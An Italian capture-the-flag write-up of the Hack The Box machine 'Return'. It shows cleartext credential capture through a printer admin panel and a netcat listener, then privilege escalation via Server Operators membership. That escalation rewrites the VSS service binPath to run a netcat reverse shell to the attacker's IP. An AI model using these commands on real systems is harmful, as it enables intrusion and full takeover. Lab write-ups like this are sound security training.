+++
date = '2026-08-28T20:10:22+02:00'
draft = false
title = 'Return Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`09/04/2025`**

![pwn.png](/images/imgs_return/pwn.png)

---
# Introduzione

**_Return_** è un **Domain Controller Windows** di livello **Easy** che evidenzia i pericoli legati all'**outbound authentication** e alle misconfigurazioni dei gruppi utente.

L'initial foothold prevede l'interazione con un **Printer Admin Panel** web. Modificando le impostazioni del **Server Address**, possiamo forzare l'applicazione a inviare le credenziali dell'account di servizio salvate in chiaro direttamente alla nostra macchina. Dopo aver ottenuto l'accesso via **WinRM** come utente **`svc-printer`**, la fase di privilege escalation richiede di sfruttare l'appartenenza al gruppo **Server Operators** per modificare il percorso dell'eseguibile di un servizio di sistema. Evitando l'uso di **Metasploit**, utilizziamo uno script batch per risolvere il problema di instabilità della shell ed estrarre con successo la **root flag**.

---
# Tecniche Utilizzate

- **Outbound Authentication Coercion**

- **Server Operators Privilege Abuse**

- **PrivEsc through Service Configuration Abuse**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- return -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV return -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-31 17:41:29Z
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local
445/tcp  open  microsoft-ds? 
464/tcp  open  kpasswd5?     
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local
3269/tcp open  tcpwrapped    
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m37s
| smb2-time: 
|   date: 2025-12-31T17:41:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

**Porte Aperte**:

- **53**/tcp - DNS

- **80**/tcp - HTTP (IIS)

- **88**/tcp - Kerberos

- **389/636/3268/3269**/tcp - LDAP/LDAPS

- **445**/tcp - SMB

- **5985**/tcp - WinRM

Basandomi sull'output di **nmap**, ho aggiunto **`return.local`** al mio file **`/etc/hosts`**.

## Enumerazione Web

Navigando sulla porta **80**, il server hosta un **HTB Printer Admin Panel**.

![web1.png](/images/imgs_return/web1.png)

Nella sezione **`settings`**, l'applicazione mostrava un **`Server Address`** che puntava a **`printer.return.local`** (che ho prontamente aggiunto al mio file **`/etc/hosts`**) e l'username di un account di servizio: **`svc-printer`**.

![web2.png](/images/imgs_return/web2.png)

---
# Accesso Iniziale | Cleartext Credential Capture

Dato che il campo della password era già precompilato, il mio primo pensiero è stato quello di ispezionare l'**elemento HTML** e cambiarlo da **`type="password"`** a **`type="text"`**. Ho fatto un test, ma il valore era letteralmente hardcodato come **`*******`**, quindi la manipolazione lato client si è rivelata un vicolo cieco.

Tuttavia, l'applicazione forniva una funzionalità di **`update`** della connessione. Poiché questa tenta di connettersi al server configurato utilizzando quelle credenziali salvate, ho sostituito il **`Server Address`** con l'indirizzo IP della mia **`tun0`**.

Ho impostato un listener **netcat** sulla porta **389** (**LDAP**):

```bash
nc -lvnp 389
```

Quando ho cliccato sul pulsante **`update`**, il server mi ha letteralmente consegnato la password in chiaro sul listener.

![pass.png](/images/imgs_return/pass.png)

**Password**: **`1edFg43012!!`**

Ho validato queste credenziali sul servizio di **remote management** usando **NetExec**:

```bash
nxc winrm return.local -u svc-printer -p '1edFg43012!!'
```

![validation.png](/images/imgs_return/validation.png)

**`(Pwn3d!)`**. Ho anche lanciato un rapido **RID brute-force** su **SMB** per cercare utenti o gruppi interessanti, ma non è emerso nulla di immediato.

```bash
nxc smb return.local -u svc-printer -p '1edFg43012!!' --rid-brute
```

![red.png](/images/imgs_return/red.png)

Mi sono connesso alla macchina tramite **Evil-WinRM** e ho recuperato la **user flag**.

```bash
evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'
```

![userf.png](/images/imgs_return/userf.png)

---
# Privilege Escalation | Server Operators to SYSTEM

Ho iniziato l'enumerazione interna manuale controllando i privilegi dell'utente:

```PowerShell
whoami /priv
```

![privs.jpeg](/images/imgs_return/privs.jpeg)

L'output ha rivelato numerosi potenziali vettori per fare **Local Privilege Escalation**:

- **`SeMachineAccountPrivilege` (Add workstations to domain)**

- **`SeLoadDriverPrivilege` (Load and unload device drivers)**

- **`SeBackupPrivilege` (Back up files and directories)**

- **`SeRestorePrivilege` (Restore files and directories)**

**Nota**: _**`SeBackupPrivilege`** permette a un utente di leggere qualsiasi file sul sistema (come i file **`NTDS.dit`** o i **registry hive** come **`SAM`**) bypassando le **ACL**. Al contrario, **`SeRestorePrivilege`** permette ad un utente di sovrascrivere qualsiasi file sul sistema, il che può essere abusato per sostituire binari di sistema o modificare chiavi di registro per ottenere code execution. **`SeLoadDriverPrivilege`** consente di caricare driver malevoli nel kernel, portando ad una compromissione diretta del sistema. **`SeMachineAccountPrivilege`** può essere sfruttato per attacchi di **Resource-Based Constrained Delegation** (**RBCD**)._

Successivamente, ho enumerato le proprietà specifiche dell'account e l'appartenenza ai gruppi locali per l'utente **`svc-printer`**:

```PowerShell
net user svc-printer
```

![group.png](/images/imgs_return/groups.png)

L'output ha rivelato che **`svc-printer`** faceva parte del gruppo built-in **`*Server Operators`**.

**Nota**: _L'appartenenza a **`Server Operators`** è estremamente pericolosa. Gli utenti in questo gruppo possono loggarsi a un server in modo interattivo, creare e cancellare share di rete, fare backup e restore di file e, cosa più importante, avviare, fermare e configurare i servizi di sistema._

Poiché i **low-hanging fruit** come **`SeBackupPrivilege`** sono spesso dei rabbit hole nelle macchine di **Hack The Box**, ho deciso di sfruttare il gruppo **`Server Operators`** per modificare il percorso dell'eseguibile di un servizio.

**Nota**: _L'escalation è stata eseguita utilizzando l'utility built-in **`sc.exe`** per modificare il **`binPath`** del servizio **Volume Shadow Copy** (**`VSS`**). **`sc.exe`** è stato scelto perché è nativo di **Windows**, non richiede tool aggiuntivi e permette la modifica diretta del path dell'eseguibile di un servizio con un singolo comando. **`VSS`** è stato scelto come servizio target perché viene eseguito con privilegi di **`NT AUTHORITY\SYSTEM`**, è tipicamente impostato su **Manual** o **Disabled** (quindi non interrompe le normali operazioni di sistema quando viene fermato/avviato), e la sua configurazione viene spesso trascurata, rendendo la tecnica sia affidabile che relativamente stealth._

Per farlo, ho caricato **`nc.exe`** sul target.

## The OSCP-Friendly Stability Bypass

Avrei potuto far puntare il **`binPath`** direttamente a una reverse shell **netcat** (**`nc.exe -e cmd.exe <attacker_ip> <attacker_port>`**), ma questo può causare problemi di stabilità, facendo cadere la connessione dopo pochi secondi. Una possibile soluzione sarebbe stata ottenere una **sessione Meterpreter** e migrare immediatamente in un processo stabile. Tuttavia, dato che mi sto preparando per l'esame **OSCP** (dove **Metasploit** è fortemente limitato), ho ideato un workaround nativo per bypassare il problema e recuperare direttamente la **root flag**.

Ho scritto un semplice script batch (**`fall.bat`**) che stampa la **root flag** e poi esegue **`cmd.exe`** per dropparmi una shell interattiva come **`SYSTEM`**.

```PowerShell
Set-Content -Path C:\Users\svc-printer\Documents\fall.bat -Value "@echo off`ntype C:\Users\Administrator\Desktop\root.txt`ncmd.exe"
```

Ho poi configurato il **`binPath`** del servizio **`VSS`** per usare **`nc.exe`** ed eseguire il mio script batch nel momento della connessione:

```PowerShell
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e C:\Users\svc-printer\Documents\fall.bat 10.10.15.152 22667"
```

![privesc1.png](/images/imgs_return/privesc1.png)

Mi sono messo in ascolto con **netcat**:

```bash
nc -lvnp 22667
```

Ho fermato e riavviato il servizio **`VSS`** per triggerare il payload:

```PowerShell
sc.exe stop vss
sc.exe start vss
```

![rootf.png](/images/imgs_return/rootf.png)

Ho ottenuto la shell come **`NT AUTHORITY\SYSTEM`**, con il valore della **root flag** stampato direttamente sul mio terminale.

---
# Considerazioni Finali

**_Return_** è un'eccellente macchina introduttiva ad **Active Directory**. La fase di initial access è un promemoria per controllare sempre verso dove i pannelli amministrativi inviano le richieste di autenticazione. La fase di privilege escalation dimostra perché l'eccessiva appartenenza a gruppi built-in (come **Server Operators**) sia altrettanto pericolosa quanto i diritti di amministrazione diretti. Infine, ideare uno script batch per bypassare l'instabilità del servizio è un ottimo esercizio di "**living off the land**" in stile **OSCP**, a dimostrazione che affidarsi a framework automatizzati come **Metasploit** raramente è l'unica strada percorribile.